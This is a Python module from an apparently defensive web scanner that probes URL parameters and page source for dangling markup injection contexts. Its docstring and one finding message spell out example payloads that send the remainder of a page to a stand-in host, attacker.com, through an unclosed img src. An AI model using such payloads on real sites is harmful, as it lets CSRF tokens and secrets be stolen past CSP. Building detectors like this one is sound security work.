"""
Dangling Markup Injection Scanner.

Dangling markup injection is a technique that allows data theft in contexts
where classic XSS is blocked by Content Security Policy. By injecting an
unclosed HTML attribute or tag, an attacker causes the browser to send
subsequent page content (including tokens, CSRF nonces, and secrets) to an
attacker-controlled server as part of an HTML attribute value.

Example attack (reflects in an attribute):
    Injection point: <input value="USER_INPUT">
    Payload: "><img src='//attacker.com/?data=
    Result in page:  <input value=""><img src='//attacker.com/?data=<token>...'>

The browser will request //attacker.com/?data=<rest of page up to next '>.
No JavaScript execution needed — bypasses script-src CSP entirely.

Blue-team checks (passive, read-only):
1. Reflect a probe value in GET params and detect if it appears inside an
   HTML attribute without proper encoding of <, >, ", '.
2. Detect open anchor contexts: <a href="USER_INPUT">, <img src="USER_INPUT">
3. Detect open <link>, <script src>, <base href> contexts in page source.
4. Check whether the response includes angle brackets or quotes reflected
   in attribute positions without encoding.

References:
  PortSwigger Research: "Evading CSP with DOM-based dangling markup"
  CWE-79 (XSS) related; OWASP A03:2021 Injection
  https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup
"""

import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urljoin

from bs4 import BeautifulSoup

from tblue.scanner.base import BaseScanner
from tblue.logger import get_logger, log_pass, log_fail, log_warn

logger = get_logger(__name__)

# Probe value — chosen to be safe and identifiable
_PROBE_VALUE = "DangMark9z7x"
_PROBE_ANGLE = _PROBE_VALUE + "<x"  # unclosed tag probe

# Maximum number of URL parameters to probe
_MAX_PARAMS = 5

# Regex to detect probe appearing inside an HTML attribute (without encoding)
# Matches: src="...PROBE...", href='...PROBE...', value="...PROBE..."
_ATTR_CONTEXT_RE = re.compile(
    r"""
    (?:src|href|action|data|value|content|formaction|srcdoc|poster|lowsrc)
    \s*=\s*
    ["']
    [^"']*
    """ + re.escape(_PROBE_VALUE),
    re.I | re.VERBOSE,
)

# Detect reflected unencoded < inside an HTML attribute value
_REFLECTED_ANGLE_RE = re.compile(
    re.escape(_PROBE_VALUE) + r"<",
    re.I,
)

# Tags that fetch external resources when given a URL — the dangerous ones
# for dangling markup (they'll make a request with the dangling content)
_RESOURCE_TAGS = re.compile(
    r"<\s*(?:img|script|link|iframe|object|embed|audio|video|source)\s[^>]*(?:src|href|data)\s*=\s*[\"'][^\"']*$",
    re.I | re.M,
)

# Patterns indicating open attribute contexts in page source (no user probe needed)
# <link rel="stylesheet" href="...unclosed> or similar
_OPEN_LINK_RE = re.compile(
    r"""<link\s[^>]*href\s*=\s*["'][^\n"'>]*$""",
    re.I | re.M,
)
_OPEN_BASE_RE = re.compile(
    r"""<base\s[^>]*href\s*=\s*["'][^\n"'>]*$""",
    re.I | re.M,
)
_OPEN_SCRIPT_RE = re.compile(
    r"""<script\s[^>]*src\s*=\s*["'][^\n"'>]*$""",
    re.I | re.M,
)


class DanglingMarkupScanner(BaseScanner):
    """Detect dangling markup injection contexts that allow CSP-bypassing data theft."""

    def scan(self, url: str) -> List[Dict[str, Any]]:
        self.results = []

        resp = self.http.get(url)
        if resp is None:
            self.results.append(self._result(
                url, "Dangling markup — target unreachable", "PASS",
                detail="No response from target; dangling markup checks skipped.",
            ))
            return self.results

        body = resp.text or ""

        # 1. Check page source for open resource-fetching attribute contexts
        self._check_open_contexts(url, body)

        # 2. Probe URL parameters for attribute-context reflection
        parsed = urlparse(url)
        if parsed.query:
            self._probe_params(url, parsed)

        if not self.results:
            log_pass(logger, f"Dangling markup — no vulnerable contexts detected on {url}")
            self.results.append(self._result(
                url,
                "Dangling markup injection — no vulnerable contexts detected",
                "PASS",
                detail=(
                    "No open HTML attribute contexts or unencoded angle bracket reflection "
                    "were detected. The page does not appear to be vulnerable to dangling "
                    "markup injection (a technique that steals data across pages without "
                    "executing JavaScript, bypassing Content-Security-Policy)."
                ),
            ))

        return self.results

    def _check_open_contexts(self, url: str, body: str) -> None:
        """Check the page source for open attribute contexts."""
        # Structural check: does the page have unclosed attribute values on resource tags?
        if _OPEN_LINK_RE.search(body):
            log_warn(logger, f"Dangling markup: open <link href=...> context in {url}")
            self.results.append(self._result(
                url,
                "Dangling markup — open <link href> attribute context",
                "WARN",
                detail=(
                    "The page source contains a <link> tag with an unclosed href attribute "
                    "value. If user-controlled content appears before the closing quote, "
                    "a dangling markup injection can force the browser to exfiltrate "
                    "page content (including tokens) to an attacker-controlled server "
                    "without executing any JavaScript — bypassing CSP script-src rules.\n\n"
                    "Fix: ensure all href attribute values are properly closed before "
                    "dynamic content is interpolated."
                ),
            ))

        if _OPEN_BASE_RE.search(body):
            log_fail(logger, f"Dangling markup: open <base href=...> context in {url}")
            self.results.append(self._result(
                url,
                "Dangling markup — open <base href> attribute context",
                "FAIL",
                detail=(
                    "The page source contains a <base> tag with an unclosed href attribute "
                    "value. This is a high-severity dangling markup context: an attacker who "
                    "can inject into this position changes the base URL for the entire page, "
                    "redirecting all relative links to an attacker-controlled origin.\n\n"
                    "Fix: ensure <base href> values are fully server-controlled and closed "
                    "before any dynamic content."
                ),
            ))

        if _OPEN_SCRIPT_RE.search(body):
            log_fail(logger, f"Dangling markup: open <script src=...> context in {url}")
            self.results.append(self._result(
                url,
                "Dangling markup — open <script src> attribute context",
                "FAIL",
                detail=(
                    "The page source contains a <script> tag with an unclosed src attribute "
                    "value. User-controlled content here can directly load arbitrary JavaScript, "
                    "bypassing CSP (if no nonce or hash is enforced on this script tag).\n\n"
                    "Fix: ensure all <script src> values are fully determined server-side "
                    "before the attribute value is closed."
                ),
            ))

    def _probe_params(self, url: str, parsed) -> None:
        """Probe URL parameters for reflection in HTML attribute contexts."""
        params = parse_qs(parsed.query, keep_blank_values=True)
        probed = 0

        for param, values in list(params.items())[:_MAX_PARAMS]:
            probed += 1
            probe_params = {k: (v[0] if k != param else _PROBE_VALUE) for k, v in params.items()}
            probe_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(probe_params)}"

            resp = self.http.get(probe_url)
            if resp is None:
                continue

            body = resp.text or ""
            if not body:
                continue

            # Check if probe appears inside an HTML attribute context
            if _ATTR_CONTEXT_RE.search(body):
                log_warn(logger, f"Dangling markup: param '{param}' reflected in attribute context on {url}")
                self.results.append(self._result(
                    url,
                    f"Dangling markup — parameter '{param}' reflected in HTML attribute",
                    "WARN",
                    detail=(
                        f"The URL parameter '{param}' is reflected inside an HTML attribute "
                        f"value (src=, href=, value=, etc.) without sufficient encoding. "
                        "An attacker can inject an unclosed attribute value to create a "
                        "dangling markup context that exfiltrates page content "
                        "(CSRF tokens, session identifiers) to an external server "
                        "without executing JavaScript — bypassing CSP script-src.\n\n"
                        "Proof: send this URL parameter with value ending in ' to check "
                        "if the attribute is prematurely closed.\n\n"
                        "Fix: HTML-encode all user-controlled values before interpolating "
                        "into HTML attributes; use template engines that auto-escape by default."
                    ),
                ))
                break

            # Check if probe appears unencoded with angle bracket (stronger evidence)
            probe_angle_params = {k: (v[0] if k != param else _PROBE_ANGLE) for k, v in params.items()}
            probe_angle_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(probe_angle_params)}"

            resp2 = self.http.get(probe_angle_url)
            if resp2 is None:
                continue

            body2 = resp2.text or ""
            if _REFLECTED_ANGLE_RE.search(body2):
                log_fail(logger, f"Dangling markup: param '{param}' reflects unencoded < in {url}")
                self.results.append(self._result(
                    url,
                    f"Dangling markup — parameter '{param}' reflects unencoded angle bracket",
                    "FAIL",
                    detail=(
                        f"The URL parameter '{param}' reflects the '<' character without "
                        "HTML-encoding. Combined with the probe value appearing near an "
                        "attribute context, this strongly indicates a dangling markup "
                        "injection vulnerability.\n\n"
                        "An attacker payload like: param=MARKER<img src='//attacker.com/?x= "
                        "would cause the browser to exfiltrate subsequent page content "
                        "(including CSRF tokens) to the attacker's server.\n\n"
                        "Fix: HTML-encode all output, especially '<', '>', '\"', \"'\"; "
                        "use Content-Security-Policy img-src 'self' to restrict image loads."
                    ),
                ))
                break
